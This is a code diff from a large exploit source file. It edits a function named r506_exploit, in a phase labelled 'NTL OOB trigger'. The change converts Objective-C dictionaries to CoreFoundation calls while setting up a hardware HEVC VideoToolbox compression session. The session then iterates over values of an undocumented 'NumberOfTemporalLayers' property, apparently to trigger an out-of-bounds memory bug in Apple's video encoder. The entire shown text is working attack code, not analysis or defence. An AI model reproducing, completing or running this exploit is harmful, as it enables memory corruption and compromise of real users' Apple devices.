@@ -30376,16 +30376,24 @@ static void r506_exploit(void) {
     rlog("--- Phase 3: NTL OOB trigger ---\n");
 
     int width = 192, height = 128;
-    NSDictionary *pba = @{
-        (NSString *)kCVPixelBufferWidthKey: @(width),
-        (NSString *)kCVPixelBufferHeightKey: @(height),
-        (NSString *)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange),
-        (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
-    };
+    CFMutableDictionaryRef pba = CFDictionaryCreateMutable(NULL, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef w_n = CFNumberCreate(NULL, kCFNumberIntType, &width);
+    CFNumberRef h_n = CFNumberCreate(NULL, kCFNumberIntType, &height);
+    int pxfmt = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
+    CFNumberRef pf_n = CFNumberCreate(NULL, kCFNumberIntType, &pxfmt);
+    CFDictionaryRef empty_dict = CFDictionaryCreate(NULL, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(pba, kCVPixelBufferWidthKey, w_n);
+    CFDictionarySetValue(pba, kCVPixelBufferHeightKey, h_n);
+    CFDictionarySetValue(pba, kCVPixelBufferPixelFormatTypeKey, pf_n);
+    CFDictionarySetValue(pba, kCVPixelBufferIOSurfacePropertiesKey, empty_dict);
+    CFRelease(w_n); CFRelease(h_n); CFRelease(pf_n); CFRelease(empty_dict);
     CVPixelBufferRef pixbuf = NULL;
     CVReturn cvr = CVPixelBufferCreate(NULL, width, height,
         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
-        (__bridge CFDictionaryRef)pba, &pixbuf);
+        pba, &pixbuf);
+    CFRelease(pba);
     if (cvr != 0 || !pixbuf) {
         rlog("  FAILED: CVPixelBufferCreate %d\n", cvr);
         goto r506_done;
@@ -30406,23 +30414,25 @@ static void r506_exploit(void) {
         int ntl = ntl_values[ni];
 
         VTCompressionSessionRef sess = NULL;
-        NSDictionary *espec = @{
-            (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES
-        };
+        CFMutableDictionaryRef espec = CFDictionaryCreateMutable(NULL, 1,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(espec, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
         OSStatus st = VTCompressionSessionCreate(NULL, width, height,
             kCMVideoCodecType_HEVC,
-            (__bridge CFDictionaryRef)espec, NULL,
+            espec, NULL,
             NULL, NULL, NULL, &sess);
+        CFRelease(espec);
         if (st != 0 || !sess) {
             rlog("  NTL=%d: session create failed %d\n", ntl, (int)st);
             continue;
         }
-        NSDictionary *ep = @{
-            (NSString *)kVTCompressionPropertyKey_RealTime: @YES,
-            (NSString *)kVTCompressionPropertyKey_ProfileLevel:
-                (NSString *)kVTProfileLevel_HEVC_Main_AutoLevel
-        };
-        VTSessionSetProperties(sess, (__bridge CFDictionaryRef)ep);
+        CFMutableDictionaryRef ep = CFDictionaryCreateMutable(NULL, 2,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(ep, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        CFDictionarySetValue(ep, kVTCompressionPropertyKey_ProfileLevel,
+            kVTProfileLevel_HEVC_Main_AutoLevel);
+        VTSessionSetProperties(sess, ep);
+        CFRelease(ep);
 
         CFNumberRef ntl_n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
         st = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), ntl_n);
